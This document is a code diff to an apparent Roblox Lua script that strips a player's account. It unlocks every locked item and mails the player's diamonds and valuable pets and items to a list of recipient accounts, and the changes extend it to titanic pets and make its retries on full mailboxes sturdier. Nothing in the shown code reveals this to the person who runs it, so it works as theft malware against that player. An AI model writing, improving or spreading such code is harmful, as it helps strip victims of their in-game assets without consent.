@@ -188,9 +188,10 @@ end
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
-    local sent = false
-    
-    repeat
+    local attempts = 0
+    local maxAttempts = maxUsers
+
+    while attempts < maxAttempts and userIndex <= maxUsers do
         local currentUser = users[userIndex]
         local args = {
             [1] = currentUser,
@@ -203,30 +204,36 @@ local function sendItem(category, uid, am)
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
         if response == true then
-            sent = true
+            -- successfully sent
             GemAmount1 = GemAmount1 - mailSendPrice
-            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
+            mailSendPrice = math.ceil(mailSendPrice * 1.5)
             if mailSendPrice > 5000000 then
                 mailSendPrice = 5000000
             end
-        elseif response == false and err == "They don't have enough space!" then
-            userIndex += 1
-            if userIndex > maxUsers then
-                sent = true
+            return true
+        else
+            -- try the next recipient if they don't have space / mailbox full
+            if err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
+                userIndex = userIndex + 1
+                attempts = attempts + 1
+            else
+                -- other errors: return false and the error so caller can decide (rate limit, cooldown, etc.)
+                return false, err
             end
         end
-    until sent
+    end
+
+    return false, "no available recipient"
 end
 
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
+            -- only attempt while we have enough gems to cover a send + a safety margin
             if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex += 1
-                local maxUsers = #users
-                local sent = false
-                
-                repeat
+                local sentAny = false
+
+                for userIndex = 1, #users do
                     local currentUser = users[userIndex]
                     local args = {
                         [1] = currentUser,
@@ -235,20 +242,32 @@ local function SendAllGems()
                         [4] = i,
                         [5] = GemAmount1 - mailSendPrice
                     }
-                    
+
                     local response, err = network.Invoke("Mailbox: Send", unpack(args))
-                    
+
                     if response == true then
-                        sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex += 1
-                        if userIndex > maxUsers then
-                            sent = true
+                        sentAny = true
+                        -- adjust gem count & price similar to sendItem
+                        GemAmount1 = GemAmount1 - mailSendPrice
+                        mailSendPrice = math.ceil(mailSendPrice * 1.5)
+                        if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
+                        break
+                    else
+                        if err == "They don't have enough space!" or err == "Mailbox is full" then
+                            -- try next user
+                        else
+                            -- other error: stop trying
+                            break
                         end
                     end
-                until sent
-                break
+                end
+
+                -- if nothing was sent to any user, exit
+                if not sentAny then
+                    break
+                end
             end
+            break -- exit after handling Diamonds
         end
     end
 end
@@ -292,44 +311,53 @@ require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
-for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
-			if v == "Pet" then
+for _, v in pairs(categoryList) do
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            local rapValue = getRAP(v, item)
+            if v == "Pet" then
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
-                if dir.huge or dir.exclusiveLevel then
-                    local rapValue = getRAP(v, item)
+                -- ✅ Include Titanic, Huge, and Exclusive pets
+                if dir.titanic or dir.huge or dir.exclusiveLevel then
                     if rapValue >= min_rap then
                         local prefix = ""
-                        if item.pt and item.pt == 1 then
+                        if item.pt == 1 then
                             prefix = "Golden "
-                        elseif item.pt and item.pt == 2 then
+                        elseif item.pt == 2 then
                             prefix = "Rainbow "
                         end
                         if item.sh then
                             prefix = "Shiny " .. prefix
                         end
                         local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        table.insert(sortedItems, {
+                            category = v,
+                            uid = uid,
+                            amount = item._am or 1,
+                            rap = rapValue,
+                            name = id
+                        })
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
             else
-                local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    table.insert(sortedItems, {
+                        category = v,
+                        uid = uid,
+                        amount = item._am or 1,
+                        rap = rapValue,
+                        name = item.id
+                    })
                     totalRAP = totalRAP + (rapValue * (item._am or 1))
                 end
             end
+
             if item._lk then
-                local args = {
-                [1] = uid,
-                [2] = false
-                }
-                network.Invoke("Locking_SetLocked", unpack(args))
+                network.Invoke("Locking_SetLocked", uid, false)
             end
         end
-	end
+    end
 end
 
 if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
